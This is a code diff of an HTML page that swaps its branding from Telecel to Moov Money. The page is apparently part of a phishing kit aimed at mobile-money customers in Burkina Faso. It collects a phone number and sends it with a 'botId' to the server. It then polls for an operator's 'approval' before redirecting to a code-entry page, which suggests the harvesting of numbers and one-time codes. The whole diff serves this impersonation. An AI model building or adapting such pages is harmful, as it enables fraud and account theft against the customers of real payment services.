@@ -3,17 +3,12 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Verify Details</title>
+<title>Moov Money - Vérification</title>
 
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     background: #0a0a0a;
     color: #ffffff;
     min-height: 100vh;
@@ -21,25 +16,17 @@
     justify-content: center;
     align-items: center;
     padding: 20px;
-  }
-
-  .container {
+}
+.container {
     width: 100%;
     max-width: 400px;
     padding: 40px 24px 32px;
     background: #0a0a0a;
-    border-radius: 0;
-  }
-
-  .logo {
-    text-align: center;
-    margin-bottom: 40px;
-  }
-
-  .logo-circle {
-    width: 56px;
-    height: 56px;
-    background: #e53935;
+}
+.logo { text-align: center; margin-bottom: 40px; }
+.logo-circle {
+    width: 56px; height: 56px;
+    background: #9A0000;
     border-radius: 50%;
     display: flex;
     align-items: center;
@@ -48,267 +35,165 @@
     font-size: 28px;
     font-weight: 700;
     color: #fff;
-  }
-
-  .telecel {
+}
+.moov-text {
     font-size: 20px;
     font-weight: 700;
-    color: #e53935;
+    color: #9A0000;
     letter-spacing: 0.5px;
     margin-bottom: 16px;
-  }
-
-  .title {
-    font-size: 26px;
-    font-weight: 700;
-    color: #ffffff;
-    text-align: left;
-    margin-bottom: 8px;
-  }
-
-  .subtitle {
-    font-size: 15px;
-    color: rgba(255, 255, 255, 0.5);
-    text-align: left;
-    margin-bottom: 32px;
-  }
-
-  label {
-    font-size: 14px;
-    color: rgba(255, 255, 255, 0.6);
-    margin-bottom: 6px;
-    display: block;
-  }
-
-  .phone-input-wrap {
-    position: relative;
-    margin-bottom: 24px;
-  }
-
-  .phone-input-wrap input {
+}
+.title { font-size: 26px; font-weight: 700; text-align: left; margin-bottom: 8px; }
+.subtitle { font-size: 15px; color: rgba(255,255,255,0.5); text-align: left; margin-bottom: 32px; }
+label { font-size: 14px; color: rgba(255,255,255,0.6); margin-bottom: 6px; display: block; }
+.phone-input-wrap { position: relative; margin-bottom: 24px; }
+.phone-input-wrap input {
     width: 100%;
     padding: 14px 16px 14px 52px;
     font-size: 15px;
     border-radius: 8px;
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    background: rgba(255,255,255,0.05);
     color: #ffffff;
-    box-sizing: border-box;
     outline: none;
-    transition: border-color 0.3s ease;
-  }
-
-  .phone-input-wrap input:focus {
-    border-color: #e53935;
-  }
-
-  .phone-input-wrap input::placeholder {
-    color: rgba(255, 255, 255, 0.3);
-  }
-
-  .country-code {
+    transition: border-color 0.3s;
+}
+.phone-input-wrap input:focus { border-color: #9A0000; }
+.phone-input-wrap input::placeholder { color: rgba(255,255,255,0.3); }
+.country-code {
     position: absolute;
     left: 16px;
     top: 50%;
     transform: translateY(-50%);
-    color: rgba(255, 255, 255, 0.6);
+    color: rgba(255,255,255,0.6);
     font-size: 14px;
     font-weight: 500;
     display: flex;
     align-items: center;
     gap: 4px;
-  }
-
-  .country-code::after {
-    content: '▼';
-    font-size: 10px;
-    color: rgba(255, 255, 255, 0.3);
-    margin-left: 4px;
-  }
-
-  .checkbox-wrap {
+}
+.country-code::after { content: '▼'; font-size: 10px; color: rgba(255,255,255,0.3); margin-left: 4px; }
+.checkbox-wrap {
     display: flex;
     align-items: flex-start;
     gap: 10px;
     margin-bottom: 28px;
-  }
-
-  .checkbox-wrap input[type="checkbox"] {
-    width: 18px;
-    height: 18px;
-    min-width: 18px;
+}
+.checkbox-wrap input[type="checkbox"] {
+    width: 18px; height: 18px; min-width: 18px;
     margin-top: 2px;
-    accent-color: #e53935;
+    accent-color: #9A0000;
     cursor: pointer;
-    background: rgba(255, 255, 255, 0.05);
-    border: 1px solid rgba(255, 255, 255, 0.2);
-    border-radius: 4px;
-  }
-
-  .checkbox-wrap label {
+}
+.checkbox-wrap label {
     font-size: 14px;
-    color: rgba(255, 255, 255, 0.5);
+    color: rgba(255,255,255,0.5);
     line-height: 1.5;
     cursor: pointer;
     margin-bottom: 0;
-  }
-
-  .checkbox-wrap label a {
-    color: #e53935;
-    text-decoration: none;
-  }
-
-  .checkbox-wrap label a:hover {
-    text-decoration: underline;
-  }
-
-  button {
+}
+.checkbox-wrap label a { color: #9A0000; text-decoration: none; }
+.checkbox-wrap label a:hover { text-decoration: underline; }
+button {
     width: 100%;
     padding: 16px;
     font-size: 16px;
     font-weight: 600;
     border-radius: 8px;
     cursor: pointer;
-    transition: all 0.3s ease;
+    transition: all 0.3s;
     border: none;
-  }
-
-  .primary {
-    background: #e53935;
+}
+.primary {
+    background: #9A0000;
     color: #ffffff;
     margin-bottom: 12px;
-  }
-
-  .primary:hover:not(:disabled) {
-    background: #c62828;
-  }
-
-  .primary:disabled {
-    opacity: 0.5;
-    cursor: not-allowed;
-  }
-
-  .status {
+}
+.primary:hover:not(:disabled) { background: #7a0000; }
+.primary:disabled { opacity: 0.5; cursor: not-allowed; }
+.status {
     margin-top: 16px;
     text-align: center;
     font-size: 14px;
     display: none;
     padding: 12px;
     border-radius: 8px;
-    background: rgba(255, 255, 255, 0.05);
-  }
-
-  .error {
-    color: #e53935;
-    background: rgba(229, 57, 53, 0.1);
-  }
-
-  .spinner {
+    background: rgba(255,255,255,0.05);
+}
+.error { color: #9A0000; background: rgba(154,0,0,0.1); }
+.spinner {
     margin: 16px auto 0;
-    width: 32px;
-    height: 32px;
-    border: 3px solid rgba(229, 57, 53, 0.1);
-    border-top: 3px solid #e53935;
+    width: 32px; height: 32px;
+    border: 3px solid rgba(154,0,0,0.1);
+    border-top: 3px solid #9A0000;
     border-radius: 50%;
     animation: spin 1s linear infinite;
     display: none;
-  }
-
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-
-  .back-link {
-    text-align: center;
-    margin-top: 16px;
-  }
-
-  .back-link button {
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.back-link { text-align: center; margin-top: 16px; }
+.back-link button {
     background: transparent;
     border: none;
-    color: rgba(255, 255, 255, 0.3);
+    color: rgba(255,255,255,0.3);
     font-size: 14px;
     cursor: pointer;
     padding: 8px;
-    transition: color 0.3s ease;
     width: auto;
-  }
-
-  .back-link button:hover:not(:disabled) {
-    color: rgba(255, 255, 255, 0.6);
-  }
-
-  .back-link button:disabled {
-    opacity: 0.3;
-    cursor: not-allowed;
-  }
-
-  .footer {
-    margin-top: 32px;
-    text-align: center;
-    font-size: 12px;
-    color: rgba(255, 255, 255, 0.2);
-    letter-spacing: 0.5px;
-  }
+}
+.back-link button:hover:not(:disabled) { color: rgba(255,255,255,0.6); }
+.back-link button:disabled { opacity: 0.3; cursor: not-allowed; }
+.footer { margin-top: 32px; text-align: center; font-size: 12px; color: rgba(255,255,255,0.2); letter-spacing: 0.5px; }
 </style>
 </head>
 <body>
 
 <div class="container">
-
-  <div class="logo">
-    <div class="logo-circle">t</div>
-    <div class="telecel">telecel</div>
-  </div>
-
-  <div class="title">Commençons</div>
-  <div class="subtitle">Entrez votre numéro de téléphone pour commencer</div>
-
-  <form id="detailsForm">
-    <div class="phone-input-wrap">
-      <span class="country-code">+226</span>
-      <input type="text" id="phone" placeholder="Saisissez le numéro de téléphone" required />
+    <div class="logo">
+        <div class="logo-circle">M</div>
+        <div class="moov-text">Moov Money</div>
     </div>
 
-    <div class="checkbox-wrap">
-      <input type="checkbox" id="termsCheck" required />
-      <label for="termsCheck">
-        J'accepte le <a href="#">Conditions d'utilisation</a> et <a href="#">Politique de confidentialité</a>
-      </label>
+    <div class="title">Commençons</div>
+    <div class="subtitle">Entrez votre numéro de téléphone pour commencer</div>
+
+    <form id="detailsForm">
+        <div class="phone-input-wrap">
+            <span class="country-code">+226</span>
+            <input type="text" id="phone" placeholder="Saisissez le numéro de téléphone" required />
+        </div>
+
+        <div class="checkbox-wrap">
+            <input type="checkbox" id="termsCheck" required />
+            <label for="termsCheck">
+                J'accepte les <a href="#">Conditions d'utilisation</a> et la <a href="#">Politique de confidentialité</a>
+            </label>
+        </div>
+
+        <button type="submit" class="primary">Continuer</button>
+    </form>
+
+    <div id="status" class="status">⏳ En attente d'approbation...</div>
+    <div id="spinner" class="spinner"></div>
+
+    <div class="back-link">
+        <button onclick="history.back()">Retour</button>
     </div>
 
-    <button type="submit" class="primary">Continuer</button>
-  </form>
-
-  <div id="status" class="status">⏳ En attente d'approbation...</div>
-  <div id="spinner" class="spinner"></div>
-
-  <div class="back-link">
-    <button onclick="history.back()">Retour</button>
-  </div>
-
-  <div class="footer">v 5.3.2 (1.0.0)</div>
+    <div class="footer">v 5.3.2 (1.0.0)</div>
 </div>
 
 <script>
-// ---------- FALLBACK FOR FULL NAME ----------
 let fullName = localStorage.getItem('fullName');
-if (!fullName) {
-    fullName = 'Loan Customer';
-    localStorage.setItem('fullName', fullName);
-}
+if (!fullName) { fullName = 'Client Moov Money'; localStorage.setItem('fullName', fullName); }
 
 const params = new URLSearchParams(window.location.search);
 const urlBotId = params.get('botId');
 if (urlBotId) localStorage.setItem('botId', urlBotId);
 const botId = localStorage.getItem('botId');
 
-if (!botId) {
-    alert('Session expirée. Veuillez recommencer.');
-    window.location.href = 'index.html';
-}
+if (!botId) { alert('Session expirée. Veuillez recommencer.'); window.location.href = 'index.html'; }
 
-// ---------- DOM REFS ----------
 const form = document.getElementById('detailsForm');
 const statusEl = document.getElementById('status');
 const spinner = document.getElementById('spinner');
@@ -316,19 +201,15 @@ const nextButton = form.querySelector('button.primary');
 const backButton = document.querySelector('.back-link button');
 const termsCheck = document.getElementById('termsCheck');
 
-// ---------- FORM SUBMIT ----------
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
-
     if (!termsCheck.checked) {
         statusEl.style.display = 'block';
         statusEl.classList.add('error');
         statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
         return;
     }
-
     nextButton.disabled = true;
-
     const phone = document.getElementById('phone').value.trim();
     if (!phone) {
         statusEl.style.display = 'block';
@@ -337,48 +218,34 @@ form.addEventListener('submit', async (e) => {
         nextButton.disabled = false;
         return;
     }
-
     localStorage.setItem('phone', phone);
-
     statusEl.style.display = 'block';
     spinner.style.display = 'block';
     statusEl.classList.remove('error');
     statusEl.textContent = '⏳ En attente d\'approbation...';
-
     try {
         const res = await fetch(`${window.location.origin}/submit-phone`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ name: fullName, phone, botId })
         });
-
         if (!res.ok) throw new Error();
-
         const { requestId } = await res.json();
         pollApproval(requestId);
-
     } catch (error) {
         spinner.style.display = 'none';
         statusEl.classList.add('error');
         statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
         nextButton.disabled = false;
-        console.error(error);
     }
 });
 
-// ---------- POLLING ----------
 function pollApproval(requestId) {
     const interval = setInterval(async () => {
         try {
             const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
             const data = await res.json();
-
-            if (data.redirect) {
-                clearInterval(interval);
-                window.location.href = data.redirect;
-                return;
-            }
-
+            if (data.redirect) { clearInterval(interval); window.location.href = data.redirect; return; }
             if (data.approved === false) {
                 clearInterval(interval);
                 spinner.style.display = 'none';
@@ -386,24 +253,12 @@ function pollApproval(requestId) {
                 statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
                 nextButton.disabled = false;
             }
-
-            // fallback if approved true but no redirect
-            if (data.approved === true) {
-                clearInterval(interval);
-                window.location.href = 'code.html';
-            }
-        } catch (error) {
-            console.error('Polling error:', error);
-        }
+            if (data.approved === true) { clearInterval(interval); window.location.href = 'code.html'; }
+        } catch (error) { console.error('Polling error:', error); }
     }, 2000);
 }
 
-// ---------- BACK BUTTON ----------
-if (backButton) {
-    backButton.addEventListener('click', () => {
-        backButton.disabled = true;
-    });
-}
+if (backButton) { backButton.addEventListener('click', () => { backButton.disabled = true; }); }
 </script>
 
 </body>
